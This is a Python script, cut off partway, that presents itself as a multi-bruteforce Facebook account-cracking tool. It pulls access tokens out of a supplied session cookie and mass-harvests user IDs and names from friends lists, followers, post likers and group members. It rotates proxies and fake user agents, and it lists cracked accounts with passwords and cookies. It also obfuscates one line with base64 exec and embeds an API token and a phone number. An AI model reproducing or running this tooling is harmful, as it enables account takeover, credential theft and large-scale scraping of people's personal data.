#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Cannot Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
exec(base64.b64decode(b'ZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBjZXRhaw=='))
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
# UA LIST
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

try:
	prox= requests.get('https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt').text
	open('.socks4.txt','w').write(prox)
except Exception as e:
	print('GAGAL')
prox=open('.socks4.txt','r').read().splitlines()
#os.system('rm -rf .socks4.txt')

for xd in range(1000):
	a='Mozilla/5.0 (SymbianOS/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='NokiaX6'
	e=random.randrange(100, 9999)
	f='/11.0.077; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Safari/413'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
#	ugen2.append(uaku)

for jiah in range(1000):
	aa='Mozilla/5.0 (iPhone'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='CPU iPhone OS 10_3_2 like Mac OS X'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(678, 9999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
#	g='AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/'
	g='AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='[FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
#	uaku2=f'{aa} {b}; {c}{e}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for bb in range(1000):

	a='BlackBerry'
	b=random.randrange(4000, 9999)
	c=random.randrange(1,6)
	d=random.choice(['0','1','2','3','4','5','6'])
	e='0'
	f=random.randrange(100, 999)
	g='Profile/MIDP-'
	h='2'
	i=random.choice(['0','1'])
	j='Configuration/CLDC-1.1'
	k='VendorID/'
	l=random.randrange(100, 999)
	ua=f'{a}{b}/{c}.{d}.{e}.{f} {g}{h}.{i} {j} {k}{l}'
	ugen2.append(ua)

def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[]
lisensiku=['sukses']
cokbrut=[]
pwpluss,pwnya=[],[]

def cocok():
	try:
		cokbru=open('.cookie.txt').read()
		cokbrut.append(cokbru)
	except:
		login_lagi334()
# COLORS
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tpc = 'TAP-A2F-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# CLEAR
def clear():
	os.system('clear')
# BACK
def back():
	login()
# BANNER
def banner():
	clear()
	wel='# SCRIPT MULTI BRUTEFORCE FACEBOOK,SCRIPT PERETASAN FACEBOOK BERBASIS MULTI BRUTE, -SCRIPT PUBLISHER BY : AMIRTZYY-'
	cik2=mark(wel ,style='bold green')
	sol().print(cik2)


	ban='''
JihadAZEIDIN db   d8b   db JIHAD Azeidin db    db 
YP  d8' 88   I8I   88 88'     `8b  d8' 
   d8'  88   I8I   88 88ooooo  `8bd8'  
  d8'   Y8   I8I   88 88~~~~~  .dPYb.  
 d8' db `8b d8'8b d8' 88.     .8P  Y8. 
d88888P  `8b8' `8d8'  Y88888P YP    YP 
©version 2.0'''             
	cetak(nel(ban, style='bold green'))
	
# VALIDASI TOKEN
def login():
	if 'sukses' in lisensiku:
#		uaku()
		cocok()
		try:
			token = open('.token.txt','r').read()
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]})
				sy2 = json.loads(sy.text)['name']
				sy3 = json.loads(sy.text)['id']
				menu(sy2,sy3)
			except KeyError:
				login_lagi334()
			except requests.exceptions.ConnectionError:
				banner()
				li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
				lo = mark(li, style='red')
				sol().print(lo, style='cyan')
				exit()
		except IOError:
			login_lagi334()
	else:lisensi()

# LOGIN
def login_lagi334():
	banner()
	pil='1'
	if pil in ['1','01']:
		try:
			cik='# LOGIN USE COOKIE'
			cik2=mark(cik ,style='red')
			sol().print(cik2)
			cooki=input("Cookie : ")
			open('.cookie.txt','w').write(cooki)
			head = {'User-Agent': 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; en-GB) AppleWebKit/534.8+ (KHTML like Gecko) Version/6.0.0.570 Mobile Safari/534.8+'}
			data = requests.get("https://business.facebook.com/business_locations", headers =head, cookies = {"cookie":cooki}) 
			find_token = re.search("(EAAG\w+)", data.text)
			ken=open(".token.txt", "w").write(find_token.group(1))
			cokrom=open('.cookie.txt','r').read()
			tokrom=open('.token.txt','r').read()
			tes = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokrom,cookies={'cookie': cokrom})
			tes3 = json.loads(tes.text)['id']
			cik='# LOGIN SUCCESSFUL, RUN AGAIN '
			cik2=mark(cik ,style='green')
			sol().print(cik2)
			exit()
		except Exception as e: 
			os.system("rm -f .token.txt")
			os.system("rm -rf .cookie.txt")
			cik='# EXPIRED COOKIE OR CHECKPOINT ACCOUNT '
			cik2=mark(cik ,style='red')
			sol().print(cik2) 
			exit()
	elif pil in ['2','02']:
		try:
			cik='# LOGIN USING JihadAzeidin V2 '
			cik2=mark(cik ,style='cyan')
			sol().print(cik2)
			cookie=input("[•] Cookie : ")
			headers = {'User-Agent': 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; en-GB) AppleWebKit/534.8+ (KHTML like Gecko) Version/6.0.0.570 Mobile Safari/534.8+'}
			ses=requests.Session()
			req = ses.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers,cookies={'cookie': cookie})
			cari_id = re.findall('act=(.*?)&nav_source', req.text)
			for bn in cari_id:
				rex = ses.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={bn}&nav_source=no_referrer', headers = headers,cookies={'cookie': cookie})
				token = re.search('(EAAB\w+)', rex.text).group(1)
				ken=open(".token.txt", "w").write(token)
			cik='# LOGIN SUCCEED '
			cik2=mark(cik ,style='green')
			sol().print(cik2)
			exit()
		except Exception as e: 
			os.system("rm -f .token.txt")
			cik='# EXPIRED COOKIE OR CHECKPOINT ACCOUNT '
			cik2=mark(cik ,style='green')
			sol().print(cik2) 
			exit()



#VALIDASI LISENSI
def anoun():
	res=requests.Session().get('https://raw.githubusercontent.com/EC-1709/a/main/Anoun.json').json()
	stanoun=res['status']
	if stanoun== "ON":
		oi = nel(tekz(str(res['isi']), justify="center"), style='yellow')
		cetak(nel(oi, title='[bold cyan] • INFORMATION • [/bold cyan]'))
		cik='# PRESS ENTER TO CONTINUE'
		cik2=mark(cik ,style='cyan')
		sol().print(cik2)
		en=input('.lisen.txt')
	else:pass
	login()
def tlisensi():
	banner()
	wel='# LICENSE IS NOT APPLICABLE OR WRONG'
	wel2 = mark(wel, style='red')
	sol().print(wel2)
	time.sleep(2)
	lisen=input('[•] Enter License : ')
	open('.lisen.txt','w').write(lisen)
	lisensi()


def lisensi():
	try:
		cek=open('.lisen.txt').read()
		lisensikuni.append(cek)
	except:
		tlisensi()
	ses=requests.Session()
	res=requests.get('https://app.cryptolens.io/api/key/Activate?token=WyIxOTgzMDgxOCIsImtjQTQwRjVVSGlNNzRub1k2dllNajBSY2JjMUgyY2MrS3hqN1F6c0QiXQ==&ProductId=15479&Key='+lisensikuni[0]).json()
	status=res['licenseKey']['key']
	if status ==cek:
		banner()
		wel='# LICENSE APPLICABLE '
		wel2 = mark(wel, style='cyan')
		sol().print(wel2)
		time.sleep(2)
		lisensiku.append("sukses")
	else:
		tlisensi()
	anoun()

# MENU
def menu(my_name,my_id):
	try:sh = requests.get('https://httpbin.org/ip').json()
	except:sh = {'origin':'-'}
	try:
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
	except:birth = '-'
	banner()
	sg = '# THIS SCRIPT SHOULD ONLY BE USED BY PEOPLE WHO HAVE OBTAINED PERMISSION FROM AUTHOR : ZWEX, CONTACT ACCESS PERMIT:085718094505'
	fx = mark(sg, style=' bold blue')
	sol().print(fx)
	sg = '# 🖥️SCRIPT USER NAME🖥️ '
	fx = mark(sg, style=' bold green')
	sol().print(fx)
	print(x+'['+h+'✓'+x+'] NAME   jihad : '+str(my_name))
	print(x+'['+h+'✓'+x+'] USER ID       : '+str(my_id))
	print(x+'['+h+'✓'+x+'] IP ADDRESS    : '+str(sh['origin']))
	io = '''[bold green]║01║ DUMP ID FROM PUBLIK	    
║02║ DUMP ID FROM  PUBLIK (MASAL)   
║03║ DUMP ID FROM FOLLOWER		     
║04║ DUMP ID FROM LIKE POSTINGAN	     
║05║ DUMP ID FROM GRUP PUBLIK
║06║ CRACK FROM FILE
║07║ CEK OPSI CEKPOIN
║08║ CEK HASIL CRACK 
║00║ KELUAR PROGRAM[bold green]'''

	oi = nel(io, style='bold blue')
	cetak(nel(oi, title='[bold green]  CRACK MENU AVAILABLE  [/bold green]'))
	ec = input(x+'['+p+'Nazir'+x+'] Choose : ')
	if ec in ['1','01']:
		dump_publik()
	elif ec in ['2','02']:
		dump_massal()
	elif ec in ['3','03']:
		dump_pengikut()
	elif ec in ['4','04']:
		dump_likes()
	elif ec in ['5','05']:
		dump_grup()
	elif ec in ['6','06']:
		crack_file()
	elif ec in ['7','07']:
		file()
	elif ec in ['8','08']:
		result()
	elif ec in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(x+'['+h+'•'+x+'] WAIT • • •')
		time.sleep(1)
		sw = '# SUCCESS OUT'
		sol().print(mark(sw, style='cyan'))
		exit()
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='red'))
		exit()

# RESULT CHECKER
def result():
	cek = '# CEK RESULT CRACK'
	sol().print(mark(cek, style='green'))
	kayes = '[bold cyan][01] CHECK CP RESULTS\n[02] CHECK OK RESULTS\n[00] BACK TO MENU[/bold cyan]'
	kis = nel(kayes, style='cyan')
	cetak(nel(kis, title='RESULTS'))
	kz = input(x+'['+p+'f'+x+'] Choose : ')
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/ZWEX-DATA/CP')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# YOU DONT HAVE CP RESULTS'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# YOUR CP RESULT'
			sol().print(mark(gerr, style='cyan'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/ZWEX-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			gerr2 = '# SELECT RESULTS TO SHOW'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'f'+x+'] choose : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# OPTION NOT IN THE MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/SHIN-DATA/CP/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# YOUR CP ACCOUNT RESULT'
			sol().print(mark(akun, style='cyan'))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			akun2 = '# YOUR CP ACCOUNT RESULT'
			sol().print(mark(akun, style='cyan'))
			input('[PRESS ENTER TO RETURN]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('/sdcard/ZWEX-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# YOU DONT HAVE OK RESULTS'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# YOUR OK RESULT'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/ZWEX-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			gerr2 = '# SELECT RESULTS TO SHOW'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'Nazir'+x+'] Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# OPTION NOT IN THE MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/ZWEX-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# YOUR OK ACCOUNT RESULT'
			sol().print(mark(akun, style='bold green'))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			akun2 = '# YOUR OK ACCOUNT RESULT'
			sol().print(mark(akun, style='green'))
			input('[PRESS ENTER TO RETURN]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='red'))
		exit()

# OPEN
def file():
	tek = '# CHECK CEKPOINT FROM FILE'
	sol().print(mark(tek, style='cyan'), style='on red')
	print(x+'['+h+'•'+x+'] READING THE FILE, WAIT A MINUTE •••')
	time.sleep(2)
	teks = '# SELECT FILES TO CHECK'
	sol().print(mark(teks, style='cyan'))
	my_files = []
	try:
		lis = os.listdir('/sdcard/ZWEX-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		yy = '# YOU DONT HAVE THE RESULTS TO CHECK'
		sol().print(mark(yy, style='red'))
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('/sdcard/ZWEX-DATA/CP/'+isi,'r').readlines()
			except:
				try:hem = open('/sdcard/ZWEX-DATA/OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
		teks2 = '# SELECT FILES TO CHECK'
		sol().print(mark(teks2, style='cyan'))
		geeh = input(x+'['+p+'f'+x+'] Choose : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# OPTION NOT IN THE MENU'
			sol().print(mark(ric, style='red'))
			exit()
		try:
			hf = open('/sdcard/ZWEX-DATA/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/ZWEX-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()

# DUMP ID PUBLIK
def dump_publik():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP PUBLIC ID'
	win2 = mark(win, style='bold green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] KETIK "me"  YOU WANT TO DUMP FROM YOUR FRIENDS')
	pil = input(x+'['+p+'f'+x+'] PUT IN ID TARGET : ')
	dumpdump(pil)
	print(x+'['+h+'•'+x+'] TOTAL : '+str(len(id)))
	setting()
def dumpdump(pil):
	try:
		head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000){id,name}&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]},headers=head).json()
		try:
			kohe=koh2['friends']['paging']['cursors']['before']
		except:
			pass
		for pi in koh2['friends']['data']:
			try:
				iso=(pi['id']+'|'+pi['name']+'|'+pi['birthday'])
				if iso in id:pass
				else:id.append(iso)
			except:
				iso=(pi['id']+'|'+pi['name'])
				if iso in id:pass
				else:id.append(iso)
				continue
	except requests.exceptions.ConnectionError:
		li = '# INTERNET CONNECTION PROBLEMS, PRESS ENTER TO CONTINUE'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		input('')
	except (KeyError,IOError):
			pass
# DUMP ID MASSAL
def dump_massal():
	mas='║01║ CRACK FROM FILE\n║02║ CRACK MANUAL(PER ID)'
	mas2=nel(mas,style='bold green')
	cetak(nel(mas2,title=' 🐍 MENU DUMP ID 🐍'))
	pilih=input('[✓] Choose : ')
	if pilih in ['1','01']:
		nmfil=input('[✓] Nama file : ')
		nmfile=open(nmfil,'r').read().splitlines()
		for xfil in nmfile:
			uid.append(xfil)
	elif pilih in ['2','02']:
		print(x+'['+h+'Nazir'+x+'] ENTER LIMIT ID TOTAL [20]')
		try:
			jum = int(input(x+'['+p+'Nazir'+x+'] Number Of Id : '))
		except ValueError:
			pesan = '# THE INPUT YOU ENTER IS NOT A NUMBERS'
			pesan2 = mark(pesan, style='bold red')
			sol().print(pesan2)
			exit()
		if jum<1 or jum>20:
			pesan = '# OUT OF RANGE MEN'
			pesan2 = mark(pesan, style='red')
			sol().print(pesan2)
			exit()
		ses=requests.Session()
		yz = 0
		print(x+'['+h+'Nazir'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
		for met in range(jum):
			yz+=1
			kl = input(x+'['+h+str(yz)+x+'] Enter The '+str(yz)+'Id : ')
			uid.append(kl)
	sed='# CURRENTLY COLLECTING UIDS, WAIT UNTIL THE NEXT OPTIONS APPEARS'
	sol().print(mark(sed, style='bold green'))
	for userr in uid:
		dumpdump(userr)
	tot = '# SUCCESSFUL COLLECTING  %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='bold red')
	else:
		tot2 = mark(tot, style='bold green')
	sol().print(tot2)
	setting()
#DUMP PENGIKUT
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP ID FROM FOLLOWERS'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'Rayap Team'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FOLLOWERS')
	pil = input(x+'['+p+'Nazir'+x+'] INPUT TARGET ID : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'Nazir'+x+'] TOTAL : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# FAILED DUMP OR BROKEN TOKEN'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
#DUMP LIKES
def dump_likes():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP ID FROM LIKE POST'
	win2 = mark(win, style='bold green')
	sol().print(win2)
	pil = input(x+'['+p+'Nazir'+x+'] INPUT ID POST : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=likes.limit(10000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
		for pi in koh2['likes']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'•'+x+'] TOTAL : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# INTERNET CONNECTION PROBLEMS, CHECK AND TRY AGAIN'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# POST IS NOT PUBLIC OR TOKEN BROKEN'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()

#DUMPS GRUP
def dump_grup():
	au = '# PASTIKAN ID GROUP PUBLIC NO PRIVATE'
	au2 = mark(au, style='cyan')
	sol().print(au2)
	idgrup = input("[•] INPUT ID/USERNAME GRUP : ")
	link = "https://mbasic.facebook.com/groups/"+idgrup
	ses = requests.Session()
	try:
		res = sop(ses.get(link, headers={"user-agent": 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'}).text, "html.parser")
	except requests.exceptions.ConnectionError:
		au = '# MASALAH KONEKSI INTERNET, PERIKSA DAN COBA LAGI'
		au2 = mark(win, style='cyan')
		sol().print(au2)
		time.sleep(0.5)
		exit()
	titt = res.find("title")
	titt2 = titt.text.replace(" | Facebook","").replace(" Grup Publik","")
	if titt2=='Masuk Facebook':
		au = '# LIMIT ON OFF AIRPLANE MODE & TRY AGAIN'
		au2 = mark(win, style='red')
		sol().print(au2)
		time.sleep(0.5)
		exit()
	elif titt2=='Kesalahan':
		au = '# GROUP NOT FOUND'
		au2 = mark(win, style='yellow')
		sol().print(au2)
		time.sleep(0.5)
		exit()
	else:pass
	xxb = res.find_all('table')
	totid = []
	for xb in xxb:
		totalid = xb.text
		tottalid = totalid.replace('Anggota','')
		try:
			jumid = int(tottalid)
			totid.append(jumid)
		except:
			pass
	au = 'GROUP NAME    : '+titt2+'\n'+'GROUP MEMBER : '+str(totid[0])
	oi = nel(au, style='cyan')
	cetak(nel(oi, title='[bold cyan] • GROUP TARGET •[/bold cyan]'))
	au = '[•] TO STOP PRESS CTRL+C\n[•] IF STUCK ON OF AIRPLANE MODE'
	oi = nel(au, style='cyan')
	cetak(nel(oi, title='[bold cyan] • SUGGESTION •[/bold cyan]'))
	linkm='https://mbasic.facebook.com/browse/group/members/?id='+idgrup
	pulkanid(linkm)
def pulkanid(linkmem):	
	member=ses.get(linkmem,cookies={'cookie': cokbrut[0]},headers={'user_agent': ''}).text
	memberr=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',member)
	for mem in memberr:
		if "profile.php?" in mem[0]:
			id.append(re.findall("id=(.*)",mem[0])[0]+"|"+mem[1])
		else:
			id.append(mem[0]+"|"+mem[1])
		sys.stdout.write('\r [•] COLLECTING  %s ID'%(len(id))); sys.stdout.flush()
	if "Lihat Selengkapnya" in member:
		time.sleep(2)
		pulkanid('https://mbasic.facebook.com'+sop(member,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
	else:
		def geh(gey):
			try:
				a=requests.get(gey,cookies={'cookie': cokbrut[0]}).text
				b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
				if len(b)!=0:
					for c in b:
						if "profile.php" in c[0]:
							d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
							if d in id:
								continue
							else:
								id.append(d+"|"+c[1])
						else:
							d=re.search("(.*?)\?refid",c[0]).group(1)
							if d in id:
								continue
							else:
								id.append(d+"|"+c[1])
						sys.stdout.write('\r  [•] COLLECTING %s ID'%(len(id))); sys.stdout.flush()
				if "Lihat Postingan Lainnya" in a:
					geh('https://mbasic.facebook.com'+sop(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				else:
					print('\n')
					setting()
			except requests.exceptions.ConnectionError:
				time.sleep(15)
				geh(gey)
			except KeyboardInterrupt:
				print('\n')
				setting()
		geh(f"https://mbasic.facebook.com/groups/"+re.search("id=(\\d*)",linkmem).group(1))
def crack_file():
	cek = '# CRACK FROM FILE DUMP'
	sol().print(mark(cek, style='green'))
	try:vin = os.listdir('/sdcard/4MBF-DATA/DUMP')
	except FileNotFoundError:
		gada = '# STORAGE NOT FOUND '
		sol().print(mark(gada, style='red'))
		time.sleep(2)
		back()
	if len(vin)==0:
		haha = '# YOU DONT HAVE FILE DUMP RESULTS'
		sol().print(mark(haha, style='yellow'))
		time.sleep(2)
		back()
	else:
		gerr = '# YOUR FILE DUMP RESULT'
		sol().print(mark(gerr, style='cyan'))
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/4MBF-DATA/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
		gerr2 = '# SELECT RESULTS TO START CRACK'
		sol().print(mark(gerr2, style='green'))
		geeh = input(x+'['+p+'f'+x+'] choose : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# OPTION NOT IN THE MENU'
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('/sdcard/4MBF-DATA/DUMP/'+geh,'r').read().splitlines()
		except:
			hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
			sol().print(mark(hehe, style='red'))
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
def tipsx():
	print('NEXT UPDATE BRO')

# PENGATURAN ID
def setting():
	wl = '# 👇CHOOSE ONE OPTION👇'
	sol().print(mark(wl, style='bold green'))
	teks = '║01║ CRACK FROM ID OLD\n║02║ CRACK DARI ID NEW\n║03║ CRACK DARI ID RANDOM'
	tak = nel(teks, style='bold green')
	cetak(nel(tak, title=''))
	hu = input(x+'['+p+'f'+x+'] Choose : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		ric = '# OPTION IS NOT IN MENU'
		sol().print(mark(ric, style='bold red'))
		exit()
	sol()
	ioz = '[bold green][01]. MOBILE FACEBOOK'
